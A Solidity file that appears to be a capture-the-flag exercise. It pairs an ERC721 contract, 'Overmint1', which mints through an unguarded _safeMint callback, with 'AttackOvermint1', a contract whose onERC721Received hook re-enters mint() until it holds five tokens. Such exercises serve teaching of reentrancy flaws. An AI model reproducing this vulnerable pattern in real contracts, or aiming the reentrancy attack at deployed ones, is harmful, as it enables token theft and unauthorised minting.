// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;

import "@openzeppelin/contracts@v4.9.6/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts@v4.9.6/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract AttackOvermint1 is IERC721Receiver {
    Overmint1 private nft;

    constructor(address nftAddress) {
        nft = Overmint1(nftAddress);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if (!nft.success(address(this))) {
            nft.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        nft.mint();
    }

    function withdraw(address _to, uint256 _tokenId) external {
        require(nft.ownerOf(_tokenId) == address(this), "Contract does not own this token");
        nft.safeTransferFrom(address(this), _to, _tokenId);
    }
}
